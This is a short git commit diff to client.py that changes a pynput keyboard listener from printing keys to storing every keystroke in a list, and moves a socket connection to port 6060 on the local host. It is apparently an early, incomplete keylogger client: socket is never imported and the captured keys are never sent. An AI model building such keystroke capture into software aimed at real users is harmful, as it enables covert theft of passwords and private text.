82eeec75f4914a05f3f755f295678c8085f024d4
zahrabytes <bukhaz99@gmail.com>
2024-01-12 11:29:29 -0600

    editing the client

--- client.py
+++ client.py
@@ -3,19 +3,21 @@ import pynput
 
 from pynput.keyboard import Key, Listener
 
+keystroke = []
+
 def on_press(key):
-    print(f"{key} pressed")
+    keystroke.append(key)
 
 def on_release(key):
     if key == Key.esc:
         return False
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((socket.gethostname(), 6060))
     listener.join()
     
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((socket.gethostname(), 6060))
-
 message = s.recv(2048)
 
 print(f"Message received: {message}")
+s.close()
